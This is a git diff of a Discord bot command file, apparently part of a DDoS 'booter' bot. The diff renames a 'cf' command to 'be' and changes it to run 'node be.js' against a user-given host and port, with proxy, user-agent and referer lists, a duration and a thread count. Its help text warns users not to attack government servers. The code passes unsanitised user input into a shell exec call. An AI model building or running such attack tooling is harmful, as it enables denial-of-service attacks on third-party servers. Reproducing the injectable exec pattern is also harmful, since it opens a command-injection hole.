@@ -18,7 +18,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;cf host time methods threads`")
+	.setDescription("`Ex ;be host time threads methods`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -26,7 +26,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node method.js ${host} ${port} ${duration} ${thread}`, (error, stdout, stderr) => {
+exec(`node be.js ${host} ${port} useragents.txt ${duration} ${thread} proxy.txt referers.txt`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -71,12 +71,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['cf'],
+  aliases: ['be'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'cf',
+  name: 'be',
   description: 'zxcr9999',
-  usage: 'cf'
+  usage: 'be'
 }
